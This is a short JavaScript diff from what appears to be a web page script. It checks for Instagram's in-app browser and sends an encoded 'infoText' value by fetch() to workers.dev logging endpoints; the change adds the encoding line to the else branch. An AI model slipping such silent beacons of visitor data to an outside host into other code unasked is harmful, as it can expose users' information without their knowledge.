@@ -86,6 +86,7 @@ if (userAgent.toLowerCase().includes("instagram") && !fromWorker) {
   const url = `https://workers.client57.workers.dev/api/rfig?result=%0A${encoded}`;
   fetch(url); 
 } else {
+  const encoded = encodeURIComponent(infoText);
   const flog = `https://workers.client57.workers.dev/api/log?result=%0A${encoded}`;
   fetch(flog);
 }
